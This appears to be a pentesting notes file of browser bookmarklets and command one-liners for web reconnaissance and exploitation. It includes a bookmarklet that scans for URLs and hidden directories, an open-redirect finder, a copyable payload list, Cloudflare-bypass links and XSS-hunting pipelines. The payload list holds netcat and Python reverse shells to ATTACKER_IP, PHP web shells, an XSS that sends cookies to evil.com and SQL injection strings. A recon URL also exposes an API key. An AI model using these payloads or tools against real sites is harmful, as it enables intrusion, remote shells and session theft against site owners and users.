# web_eb

```javascript
javascript:void(function(){let e=document.createElement('div');e.style.cssText='position:fixed;bottom:0;left:0;width:100%;height:300px;background:#1a1a1a;color:#00ff00;z-index:999999;padding:20px;overflow:auto;font-family:monospace;';e.innerHTML='<h3%20style="color:#00ff00">%F0%9F%94%8D%20BlackLine%20Scanner</h3><div%20id="results">Scanning...</div>';document.body.appendChild(e);let%20currentDomain=window.location.hostname;let%20foundUrls=new%20Set();function%20findUrls(){let%20urls=[];let%20sources=[...document.getElementsByTagName('a'),...document.getElementsByTagName('script'),...document.getElementsByTagName('img'),...document.getElementsByTagName('link'),...document.getElementsByTagName('form')];sources.forEach(element=>{if(element.href)urls.push(element.href);if(element.src)urls.push(element.src);if(element.action)urls.push(element.action);});let%20content=document.documentElement.innerHTML;let%20urlPattern=/(?:url\(|href="|src="|action="|url:|endpoint:|path:|route:)\s*['"]?([^'"\)\s>]+)/gi;let%20match;while((match=urlPattern.exec(content))!==null){if(match[1]&&!match[1].startsWith('data:'))urls.push(match[1]);}let%20scriptPattern=/"[^"]*"|'[^']*'/g;let%20scripts=document.documentElement.innerHTML.match(scriptPattern)||[];scripts.forEach(script=>{let%20urlMatches=script.match(/(?:\/[a-zA-Z0-9_-]+)+(?:\.[a-zA-Z0-9]+)?/g)||[];urlMatches.forEach(url=>urls.push(url));});performance.getEntriesByType('resource').forEach(entry=>urls.push(entry.name));return[...new%20Set(urls)];}let%20allUrls=findUrls();allUrls.sort();document.getElementById('results').innerHTML=`%20<div%20style="margin:10px%200;color:#00ff00">%E2%9C%85%20Found%20${allUrls.length}%20URLs%20&%20Endpoints%20on%20${currentDomain}</div>%20<div%20style="background:#2a2a2a;padding:10px;border-radius:5px">%20${allUrls.map(url=>`<div%20style="color:white;margin:5px%200;padding:5px;background:#333;border-radius:3px;word-break:break-all">${url}</div>`).join('')}%20</div>`;})();
```
## updated endpoint
```javascript
javascript:void(function(){let e=document.createElement('div');e.style.cssText='position:fixed;bottom:0;left:0;width:100%;height:300px;background:#1a1a1a;color:#00ff00;z-index:999999;padding:20px;overflow:auto;font-family:monospace;';e.innerHTML='<div%20style="display:flex;justify-content:space-between;align-items:center;"><h3%20style="color:#00ff00;margin:0;">%F0%9F%94%8D%20BlackLine%20Scanner</h3><button%20id="closeScanner"%20style="background:red;color:white;border:none;padding:5px%2010px;cursor:pointer;font-weight:bold;">X</button></div><div%20id="tabs"%20style="display:flex;gap:10px;margin:10px%200;"><button%20id="showAll"%20style="background:#333;color:#00ff00;border:none;padding:5px%2010px;cursor:pointer;">All%20URLs</button><button%20id="showJS"%20style="background:#333;color:#00ff00;border:none;padding:5px%2010px;cursor:pointer;">JS%20Files</button><button%20id="showDirs"%20style="background:#333;color:#00ff00;border:none;padding:5px%2010px;cursor:pointer;">Hidden%20Dirs</button></div><div%20id="results"%20style="display:block;"></div><div%20id="jsResults"%20style="display:none;"></div><div%20id="dirResults"%20style="display:none;color:white;">Scanning...</div>';document.body.appendChild(e);document.getElementById("closeScanner").onclick=function(){e.remove();};document.getElementById("showAll").onclick=function(){document.getElementById("results").style.display="block";document.getElementById("jsResults").style.display="none";document.getElementById("dirResults").style.display="none";};document.getElementById("showJS").onclick=function(){document.getElementById("results").style.display="none";document.getElementById("jsResults").style.display="block";document.getElementById("dirResults").style.display="none";};document.getElementById("showDirs").onclick=function(){document.getElementById("results").style.display="none";document.getElementById("jsResults").style.display="none";document.getElementById("dirResults").style.display="block";};let%20currentDomain=window.location.origin,foundUrls=new%20Set();function%20findUrls(){let%20urls=new%20Set();document.querySelectorAll('a[href],%20script[src],%20img[src],%20link[href],%20form[action]').forEach(el=>{let%20u=el.href||el.src||el.action;if(u&&!u.startsWith('data:')&&u!=="about:blank")try{urls.add(new%20URL(u,location.href).href);}catch{}});document.documentElement.innerHTML.replace(/(?:url\(|href=|src=|action=)["']?([^"'\s>]+)/gi,(m,u)=>{if(u&&!u.startsWith('data:')&&u!=="about:blank")try{urls.add(new%20URL(u,location.href).href);}catch{}});performance.getEntriesByType('resource').forEach(e=>{if(e.name&&e.name!=="about:blank")urls.add(e.name);});return%20Array.from(urls);}let%20allUrls=findUrls().sort(),jsFiles=allUrls.filter(url=>url.endsWith('.js'));let%20commonDirs=["robots.txt","sitemap.xml",".git/","admin/","backup/","config/","database/","env/","logs/","uploads/","cgi-bin/","wp-admin/","wp-content/","wp-includes/"];let%20hiddenDirs=commonDirs.map(dir=>`${currentDomain}/${dir}`);document.getElementById('results').innerHTML=`<div%20style="margin:10px%200;color:#00ff00">%E2%9C%85%20Found%20${allUrls.length}%20URLs%20&%20Endpoints%20on%20${window.location.hostname}</div><div%20style="background:#2a2a2a;padding:10px;border-radius:5px">${allUrls.map(url=>`<div%20style="color:white;margin:5px%200;padding:5px;background:#333;border-radius:3px;word-break:break-all">${url}</div>`).join('')}</div>`;document.getElementById('jsResults').innerHTML=`<div%20style="margin:10px%200;color:#00ff00">%E2%9C%85%20Found%20${jsFiles.length}%20JavaScript%20Files</div><div%20style="background:#2a2a2a;padding:10px;border-radius:5px">${jsFiles.map(url=>`<div%20style="color:white;margin:5px%200;padding:5px;background:#333;border-radius:3px;word-break:break-all">${url}</div>`).join('')}</div>`;async%20function%20checkHiddenDirs(){let%20resultHtml=`<div%20style="margin:10px%200;color:#00ff00">%E2%9C%85%20Scanning%20Hidden%20Directories</div><div%20style="background:#2a2a2a;padding:10px;border-radius:5px">`;for(let%20url%20of%20hiddenDirs){try{let%20res=await%20fetch(url,{method:"HEAD",mode:"no-cors"});let%20status=res.status||"Unknown";resultHtml+=`<div%20style="color:white;margin:5px%200;padding:5px;background:#333;border-radius:3px;word-break:break-all">${url}%20<span%20style="color:${status===200?"#0f0":status===403?"yellow":"red"}">[${status}]</span></div>`;}catch{resultHtml+=`<div%20style="color:white;margin:5px%200;padding:5px;background:#333;border-radius:3px;word-break:break-all">${url}%20<span%20style="color:red">[Failed]</span></div>`;}}resultHtml+=`</div>`;document.getElementById('dirResults').innerHTML=resultHtml;}checkHiddenDirs();})();
```
## open redirect
```javascript
javascript:void(function(){let e=document.createElement('div');e.style.cssText='position:fixed;bottom:0;left:0;width:100%;height:500px;background:#1a1a1a;color:#00ff00;z-index:999999;padding:20px;overflow:auto;font-family:monospace;';e.innerHTML='<h3%20style="color:#00ff00">%F0%9F%94%8E%20Open%20Redirect%20Vulnerability%20Scanner</h3><div%20id="results">Scanning...</div>';document.body.appendChild(e);let%20currentDomain=window.location.hostname;let%20foundUrls=new%20Set();function%20findOpenRedirects(){let%20urls=[];let%20redirectParams=['redirect','url','return','destination','next','continue'];let%20sources=[...document.getElementsByTagName('a'),...document.getElementsByTagName('form')];sources.forEach(element=>{if(element.href){redirectParams.forEach(param=>{if(element.href.includes(param+'='))urls.push(element.href);});}if(element.action){redirectParams.forEach(param=>{if(element.action.includes(param+'='))urls.push(element.action);});}});let%20content=document.documentElement.innerHTML;let%20urlPattern=/(?:url\(|href="|src="|action="|url:|endpoint:|path:|route:)\s*['"]?([^'"\)\s>]+)/gi;let%20match;while((match=urlPattern.exec(content))!==null){if(match[1]&&!match[1].startsWith('data:'))redirectParams.forEach(param=>{if(match[1].includes(param+'='))urls.push(match[1]);});}return[...new%20Set(urls)];}let%20openRedirects=findOpenRedirects();openRedirects.sort();document.getElementById('results').innerHTML=`<div%20style="margin:10px%200;color:#00ff00">%E2%9C%94%20Found%20${openRedirects.length}%20Potential%20Open%20Redirect%20URLs%20on%20${currentDomain}</div><div%20style="background:#2a2a2a;padding:10px;border-radius:5px">${openRedirects.map(url=>`<div%20style="color:white;margin:5px%200;padding:5px;background:#333;border-radius:3px;word-break:break-all">${url}</div>`).join('')}</div>`;})();
```
## payload
```javascript
javascript:(function(){let w="100%",h=350;let frame=document.createElement("div");frame.style.cssText=`position:fixed;bottom:0;left:0;width:${w};height:${h}px;background:#1a1a1a;color:#00ff00;z-index:999999;border-top:2px%20solid%20#00ff00;overflow:hidden;box-shadow:0%200%2010px%20rgba(0,255,0,0.5);padding:10px;font-family:monospace;resize:vertical;display:flex;flex-direction:column;`;frame.innerHTML=`<div%20style="text-align:center;font-size:18px;padding:5px;background:#000;color:#0f0;font-weight:bold;border-bottom:2px%20solid%20#00ff00;">%F0%9F%9A%80%20Mr.NoOne%20Payloads%20%F0%9F%9A%80</div><div%20style="display:flex;flex:1;gap:10px;padding:10px;"><div%20id="vulnList"%20style="flex:1;padding:10px;border-right:2px%20solid%20#00ff00;overflow:auto;height:100%;"><strong%20style="color:#00ff00;">%F0%9F%94%A5%20Vulnerabilities</strong><div%20id="payloads"></div></div><div%20id="payloadBox"%20style="flex:3;padding:10px;overflow:auto;height:100%;"><strong%20style="color:#00ff00;">%F0%9F%93%9C%20Payloads</strong><div%20id="payloadContainer"></div></div></div><button%20id="close"%20style="position:absolute;top:10px;right:10px;background:red;color:white;border:none;padding:8px%2012px;font-size:14px;cursor:pointer;border-radius:5px;">%E2%9D%8C%20Close</button>`;let%20payloads={"Netcat%20Reverse%20Shell":[{payload:"nc%20-e%20/bin/sh%20ATTACKER_IP%20PORT"},{payload:"nc.exe%20-e%20cmd.exe%20ATTACKER_IP%20PORT"}],"PHP%20RCE":[{payload:"<?php%20system($_GET['cmd']);%20?>"},{payload:"<?php%20eval($_GET['cmd']);%20?>"}],"Python%20Reverse%20Shell":[{payload:"import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"}],"XSS%20Payloads":[{payload:'"><script>alert(1)</script>'},{payload:'"><script>document.location="http://evil.com/steal.php?c="+document.cookie</script>'}],"SQL%20Injection":[{payload:"'%20OR%20'1'='1'%20--%20"},{payload:"'%20UNION%20SELECT%20username,password%20FROM%20users%20--%20"}]};;let%20payloadsDiv=frame.querySelector("#payloads"),payloadContainer=frame.querySelector("#payloadContainer");Object.keys(payloads).forEach(category=>{let%20btn=document.createElement("button");btn.innerText=category;btn.style.cssText="background:#333;color:#00ff00;padding:5px;margin:5px%200;border:none;width:100%;cursor:pointer;text-align:left;font-weight:bold;";btn.onclick=()=>{payloadContainer.innerHTML="";payloads[category].forEach(p=>{let%20payloadBox=document.createElement("div");payloadBox.style.cssText="background:#000;padding:10px;color:#0f0;border-radius:5px;white-space:pre-wrap;word-break:break-all;margin-bottom:10px;display:flex;align-items:center;overflow:auto;max-width:100%;";let%20pre=document.createElement("pre");pre.innerText=p.payload;pre.style.cssText="flex:1;margin:0;overflow:auto;padding:5px;max-width:100%;";let%20copyBtn=document.createElement("button");copyBtn.innerText="Copy";copyBtn.style.cssText="margin-left:10px;background:#222;color:#0f0;padding:5px;border:none;cursor:pointer;";copyBtn.onclick=()=>{navigator.clipboard.writeText(p.payload);};payloadBox.appendChild(pre);payloadBox.appendChild(copyBtn);payloadContainer.appendChild(payloadBox);});};payloadsDiv.appendChild(btn);});document.body.appendChild(frame);document.getElementById("close").onclick=function(){frame.remove();};})();
```
- __[1 Cloudflare Bypass](https://github.com/sarperavci/CloudflareBypassForScraping)__
- __[2 Cloudflare Bypass](https://github.com/christophetd/CloudFlair.git)__


### RECON METHOD BY ~/.COFFINXP
```php
https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original

https://www.virustotal.com/vtapi/v2/domain/report?apikey=982680b1787fa59701919aa22515a025e00df1e3bb2bc4f186b8e919558d576c&domain=example.com

https://otx.alienvault.com/api/v1/indicators/hostname/domain.com/url_list?limit=500&page=1

curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.example.com/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > out.txt

cat out.txt | uro |  grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc'
```

### xss oneliner

```
echo "testphp.vulnweb.com" | waybackurls | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew -p | pvreplace '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' -vuln
```

- ```echo "testphp.vulnweb.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln```

- `echo "testphp.vulnweb.com" | katana -passive -pss waybackarchive,commoncrawl,alienvault | uro | gf xss | Gxss -p XSSRef | dalfox pipe`

- `subfinder -d testphp.vulnweb.com -all -silent | katana -passive -pss waybackarchive,commoncrawl,alienvault | uro | gf xss | Gxss -p XSSRef | dalfox pipe`
  __Tools used__
- __[waybackurls](https://github.com/tomnomnom/waybackurls.git)__
- __[urldedupe](https://github.com/ameenmaali/urldedupe.git)__
- __[unew](https://github.com/rix4uni/unew)__
- __[pvreplace](https://github.com/rix4uni/pvreplace)__
- __[xsschecker](https://github.com/rix4uni/xsschecker)__
